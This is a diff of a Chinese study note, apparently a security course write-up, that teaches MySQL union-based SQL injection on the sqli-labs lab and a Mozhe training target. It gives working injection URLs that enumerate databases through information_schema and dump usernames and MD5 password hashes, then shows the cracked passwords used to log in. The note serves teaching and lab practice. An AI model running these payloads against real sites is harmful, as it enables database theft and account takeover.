@@ -32,7 +32,9 @@
 1. 对用户输入的参数没有进行严格过滤（如过滤单双引号 尖括号等），就被带到数据库执行，造成了SQL注入
 2. 使用了字符串拼接的方式构造SQL语句
 
-### 代码：以sqlilabs-Lesson-2为例查看PHP参数的传递和SQL语句的构造过程
+### 简易代码分析SQL注入原理
+
+以sqlilabs-Lesson-2为例查看PHP参数的传递和SQL语句的构造过程
 
 以下是sqlilabs-Lesson-2目录下的index.php代码中的php部分，注意看中文注释
 
@@ -131,7 +133,9 @@ SELECT * FROM users WHERE id=-2 union select 1,email_id,3 from emails LIMIT 0,1
 
 ![](https://gitee.com/YatJay/image/raw/master/img/202201281556015.png)
 
-### 产生条件：可控变量，代入数据库查询，变量未过滤或过滤不严谨
+### SQL注入产生条件
+
+**可控变量，代入数据库查询，变量未过滤或过滤不严谨**
 
 - 可控变量：即变量可以由客户端控制，或者说可以通过参数传递改变
 
@@ -147,7 +151,7 @@ SELECT * FROM users WHERE id=-2 union select 1,email_id,3 from emails LIMIT 0,1
 
 - 变量未过滤或过滤不严谨
 
-### 可能存在SQL注入的特征
+### 可能存在SQL注入的URL特征
 
 问：以下可能存在注入的编号选项？
 
@@ -195,11 +199,11 @@ https://github.com/Audi-1/sqli-labs
 
 **信息收集**：不同于前面广义的信息收集，此处SQL注入的信息收集只涉及收集数据库相关的信息，为后续SQL注入操作做准备
 
-**数据注入**：看图
+**数据注入**：看图：高低版本以MySQL5.0为界限，5.0版本之前没有information_schema数据库
 
 **高权限注入**：下一天
 
-![](https://gitee.com/YatJay/image/raw/master/img/202201281516171.png)
+![红框为本节内容](https://gitee.com/YatJay/image/raw/master/img/202201302156095.png)
 
 ### MySQL数据库的基本结构
 
@@ -217,7 +221,9 @@ https://github.com/Audi-1/sqli-labs
 
 鼠标右键phpstudy——MySQL工具——MySQL命令行——输入数据库密码——`mysql>`
 
-#### 最常用的显示命令
+#### 常用的MySQL命令及其显示效果
+
+##### 常用MySQL命令
 
 | 作用                   | 命令                                         |
 | ---------------------- | -------------------------------------------- |
@@ -231,29 +237,84 @@ https://github.com/Audi-1/sqli-labs
 | 建表                   | use 库名；create table 表名 (字段设定列表)； |
 | 删库和删表             | drop database 库名;    drop table 表名；     |
 
-#### 执行命令的显示效果
+##### 执行命令的显示效果
 
-show databases;   显示数据库列表
+###### show databases;   显示数据库列表
 
 ![](https://gitee.com/YatJay/image/raw/master/img/202201282333037.png)
 
- use 数据库名;   切换数据库
+###### use 数据库名;   切换数据库
 
 ![](https://gitee.com/YatJay/image/raw/master/img/202201282334302.png)
 
-show tables;   显示数据库中的表名列表
+###### show tables;   显示数据库中的表名列表
 
 ![](https://gitee.com/YatJay/image/raw/master/img/202201282335546.png)
 
-select * from 表名;    显示表中的所有记录
+###### select * from 表名;    显示表中的所有记录
 
 ![](https://gitee.com/YatJay/image/raw/master/img/202201282336007.png)
 
-==**select * from users where id = 5 or id = 6;  查询特定条件下的数据记录可见查询结果是一条或多条的数据记录**==
+###### ==**select * from users where id = 5 or id = 6;  查询特定条件下的数据记录可见查询结果是一条或多条的数据记录**==
 
 ![](https://gitee.com/YatJay/image/raw/master/img/202201282338573.png)
 
-### 对SQL注入而言MySQL必知知识点——information_schema数据库(数据库字典)
+#### order by 1,2,3,4——用于猜解字段数量
+
+###### 含义
+
+sql语句中order by 1或者order by 2...order by N
+
+其实1表示第一个栏位,2表示第二栏位; 
+
+依此类推,**当表中只有2个栏位时,oder by 3就会出错**,这个跟order by 列名没有什么区别,不过在特殊情况下还是很有用的.
+
+###### 注意
+
+- ORDER BY ASC应该没有这样写法,ORDER BY 后面不是字段就是数字;
+
+- 可以ORDER BY 1 ASC 或者ORDER BY COL1 ASC ;
+
+- ASC表示按升序排序,DESC表示按降序排序
+
+###### 执行
+
+select * from users order by 3  limit 0,5;
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201290951431.png)
+
+#### select 1,2,3,4,5——猜解输出位置
+
+select 1,2,3 from users;    效果如下
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201290928255.png)
+
+#### limit N,M——变动猜解多个数据
+
+select 1,2,3 from users limit 0,1; 
+
+- **limit N,M** : 相当于 **limit M offset N** , 从第 N 条记录开始, 返回 M 条记录；
+- 此句在SQL注入中用于猜解输出位置
+
+select * from users;    查询users表的所有数据
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201290927150.png)
+
+select * from users limit 0,1;  查询users表的所有信息，只显示第0条数据(从0开始计数)
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201290949226.png)
+
+select 1,2,3 from users limit 0,1;
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201290943738.png)
+
+select 1,2,3,4,5,6,7 from users limit 0,1;
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201290943429.png)
+
+#### group_concat()函数——连接一个组的所有字符串，并以逗号分隔每一条数据
+
+[group_concat函数使用详解](https://www.iteye.com/blog/hchmsguo-555543)
 
 #### information_schema数据库(数据库字典)
 
@@ -269,18 +330,18 @@ information_schema这这个数据库中保存了MySQL服务器所有数据库的
 
 数据库中符号"."代表下一级，如xiaodi.user表示xiaodi数据库下的user表名。
 
-| 表名                        | 字段信息                                    |
-| --------------------------- | ------------------------------------------- |
-| information_schema.schemata | 列schema_name记录了所有数据库的名字         |
-| information_schema.tables   | 列table_schema记录了所有数据库的名字        |
-| information_schema.tables   | 列table_name记录了所有数据库的表的名字      |
-| information_schema.columns  | 列table_schema记录了所有数据库的名字        |
-| information_schema.columns  | 列table_name记录了所有数据库的表的名字      |
-| information_schema.columns  | 列column_name记录了所有数据库的表的列的名字 |
+| 表名                        | 字段信息                                                     |
+| --------------------------- | ------------------------------------------------------------ |
+| information_schema.schemata | 列schema_name记录了所有数据库的名字(高权限跨库查询时用来查数据库名) |
+| information_schema.tables   | 列table_schema记录了所有数据库的名字                         |
+| information_schema.tables   | 列table_name记录了所有数据库的表的名字                       |
+| information_schema.columns  | 列table_schema记录了所有数据库的名字                         |
+| information_schema.columns  | 列table_name记录了所有数据库的表的名字                       |
+| information_schema.columns  | 列column_name记录了所有数据库的表的列的名字                  |
 
 MySQL版本5.0 以下没有 information_schema 这个系统表，无法列表名等，只能暴力跑表名。
 
-#### information_schema数据库概览
+##### information_schema数据库概览
 
 如information_schema数据库中的tables表如下：
 
@@ -294,7 +355,7 @@ MySQL版本5.0 以下没有 information_schema 这个系统表，无法列表名
 
 ![](https://gitee.com/YatJay/image/raw/master/img/202201281932899.png)
 
-### SQL注入的最一般步骤
+### SQL注入的最一般流程
 
 #### 第1步：判断是否存在注入点
 
@@ -349,11 +410,11 @@ SELECT * FROM users WHERE id=1dadad(随便输入) LIMIT 0,1
 
 提交?id=1 order by x 
 
-x可先后尝试1、2、3、4、5……；x是正常与错误的临界值
+x可先后尝试1、2、3、4、5……x；x是正常与错误的临界值
 
 ##### order by猜解列名字段数量原理
 
-order by是mysql中对查询数据进行排序的方法， 使用示例
+order by是mysql中对查询数据进行排序的方法，**是对查询结果进行排序**， 使用示例
 
 ```sql
 select * from 表名 order by 列名(或者数字) asc；升序(默认升序)
@@ -369,7 +430,9 @@ selecr * from user order by 1;
 
 order by 用于判断显示位，order by 原有的作用是对查询结果按照第x个字段进行排序。
 
-在sql注入中用order by 来判断排序，order by 1就是对一个字段进行排序，如果一共4个字段，你order by 5 ，则数据库不知道怎么排序，就执行错误无返回值。因此字段数量x就是order by正常排序与错误排序的临界值。
+在sql注入中用order by 来判断排序，order by 1就是对一个字段进行排序，如果一共4个字段，你order by 5 ，则数据库不知道怎么排序，就执行错误无返回值，字段数量x就是order by正常排序与错误排序的临界值。
+
+_**查询结果是一条或多条数据构成的表，因此通过order by x 就能知道最终查询结果包含几个字段，因为后续的union联合查询的字段数必须相同。**_
 
 #### 第3步：联合查询寻找输出点 union select 1,2,3,…,x
 
@@ -379,13 +442,60 @@ union为联合查询，a联合b进行了查询，为查询了前面的sql语句(
 
 ##### -1 union select1,2,3,…,x寻找输出点
 
-==///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////==
+正常查询语句的执行结果可能是一条或多条数据，**通过代码调整在输出时只显示特定的一条或多条数据的部分字段**。
+
+***因此设法让前一部分SQL语句执行结果为空，联合后一段执行select1,2,3,…,x，就能知道输出时显示的字段是在1,2,3,4的哪个位置，后续只需要调整输出位置的数字，让前段显示我们想要的结果。***
+
+#### 第4步：信息收集——在注入点处向系统自带库查询库名、表名、字段名
+
+##### 爆数据库基本信息
+
+| 所用函数      | 收集信息           |
+| ------------- | ------------------ |
+| version() | 查数据库版本       |
+| database()    | 查数据库名称   |
+| user()        | 查用户名 |
+| @@version_compile_os| 查操作系统         |
+
+##### 在系统自带数据库information_schema中爆表名和字段名
+
+###### **利用 union select 联合查询information_schema.tables，获取表名**
+
+**即查询名为当前数据库(上述database()已经查到)的数据库下，有哪些数据表，得到当前数据库的所有表名**
+
+```sql
+?id=-1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='已知库名'
+```
+
+###### **利用 union select 联合查询information_schema.columns，获取列名(字段名)**
+
+**即查询名为已知表名的数据表中，有哪些列(字段)，得到当前数据库的这张表中的所有列名**
+
+```sql
+?id=-1'union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='已知表名'
+```
+
+_**至此，我们已经能知道当前数据库的所有表名以及所有数据表的所有列名，对于一个基本查询语句`SELECT 列名1,列名2 FROM 表名`而言，已经具备了基本条件。**_
+
+#### 第5步：查询指定数据
+
+**利用 union select 联合查询上述查到的表名，获取列值(字段值)**
+
+```sql
+?id=-1' union select 1,列名1,列名2,4 from 已知表名
+```
+
+
 
 # 涉及案例
 
 ## 简易代码分析SQL注入原理
 
+(见上)
+
 ## sqlilabs注入靶场搭建简要使用
+
+(见上)
 
 ## 墨者靶机真实MySQL注入演示
 
@@ -413,13 +523,122 @@ order by 5 显示异常  http://219.153.49.228:45239/new_list.php?id=1%20order%2
 
 ![](https://gitee.com/YatJay/image/raw/master/img/202201282128749.png)
 
-### 第3步：报错猜解准备
+### 第3步：联合查询寻找输出点 union select 1,2,3,…,x
 
-http://219.153.49.228:49521/new_list.php?id=1 union select 1,2,3,4
+http://219.153.49.228:49521/new_list.php?id=-1 union select 1,2,3,4
 
+![](https://gitee.com/YatJay/image/raw/master/img/202201291018184.png)
 
+### 第4步：信息收集——库名、表名、字段名
 
+#### 爆数据库基本信息
 
+##### 爆数据库版本、数据库名
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201291030371.png)
+
+##### 爆用户名、操作系统
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201291031647.png)
+
+得到以下基础信息：
+
+| 收集信息   | 值                      |
+| ---------- | ----------------------- |
+| 数据库版本 | 5.7.22-0ubuntu0.16.04.1 |
+| 数据库名称 | mozhe_Discuz_StormGroup |
+| 用户名     | root                    |
+| 操作系统   | Linux                   |
+
+#### 在系统自带数据库information_schema中爆表名和字段名
+
+##### 查询指定数据库名下的所有表名信息：
+
+在informa_schema数据库中指定`table_schema`字段(即数据库名)的值为`mozhe_Discuz_StormGroup`下的所有表名`table_name`信息：
+
+```sql
+http://219.153.49.228:49521/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=‘mozhe_Discuz_StormGroup’
+```
+
+```sql
+//在informa_schema库中查询table_schema为‘mozhe_Discuz_StormGroup’的所有数据，输出到注入点
+select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=‘mozhe_Discuz_StormGroup’  
+```
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201291139026.png)
+
+得到数据库 `mozhe_Discuz_StormGroup`中一共有两张表，表名分别是`StormGroup_member`和`notice`
+
+##### 查询指定表名的所有列名信息
+
+在information_schema数据库中指定`table_name`字段(即表名)的值为`StormGroup_member`下的所有列名`column_name`信息：
+
+```sql
+http://219.153.49.228:43230/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=‘StormGroup_member’
+```
+
+```sql
+//在informa_schema库中查询table_name为‘StormGroup_member’的所有数据，输出到注入点
+select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=‘StormGroup_member’
+```
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201291152915.png)
+
+得到数据库`mozhe_Discuz_StormGroup`中的表`StormGroup_member`中一共有4列，列名分别为`id`、`name`、`password`、`status`
+
+至此我们就掌握了当前数据库`mozhe_Discuz_StormGroup`下的表`StormGroup_member`的全部信息，同理可以查到数据库`mozhe_Discuz_StormGroup`下其他表的信息。
+
+比如`StormGroup_member`表的结构如下：
+
+| id   | name | password | status |
+| ---- | ---- | -------- | ------ |
+| ……   | ……   | ……       | ……     |
+
+### 第5步：查询指定数据
+
+#### 查询用户表中的用户名和密码信息
+
+认定`StormGroup_member`就是数据库的用户表
+
+在数据库`mozhe_Discuz_StormGroup`中的表`StormGroup_member`中查询用户名和密码信息
+
+```sql
+http://219.153.49.228:49521/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member
+```
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201291205177.png)
+
+#### 猜解多个数据——通过limit n,1 变动猜解多个数据
+
+如果查询结果是多条数据，而输出显示只显示一条数据中的部分字段，采用limit n,1来将每一条数据显示到注入输出点处：
+
+```sql
+http://219.153.49.228:49521/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 0,1
+```
+![](https://gitee.com/YatJay/image/raw/master/img/202201291210870.png)
+```sql
+http://219.153.49.228:49521/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1
+```
+![](https://gitee.com/YatJay/image/raw/master/img/202201291209625.png)
+```sql
+http://219.153.49.228:49521/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 2,1
+```
+![](https://gitee.com/YatJay/image/raw/master/img/202201291210927.png)这就说明数据库`mozhe_Discuz_StormGroup`中的表`StormGroup_member`中只有2条数据，其用户名和密码如下：
+
+| id   | name  | password                                       | status |
+| ---- | ----- | ---------------------------------------------- | ------ |
+| ……   | mozhe | 356f589a7df439f6f744ff19bb8092c0  解密：dsan13 | ……     |
+| ……   | mozhe | e88c63a5c7b6fa8e5055ad185755a8dc 解密：176387  | ……     |
+
+对查到的密码进行MD5解密后尝试登录：
+
+第一个用户被禁用：
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201291215472.png)
+
+第二个用户成功登录并拿到flag：
+
+![](https://gitee.com/YatJay/image/raw/master/img/202201291216542.png)
 
 # 涉及资源
 
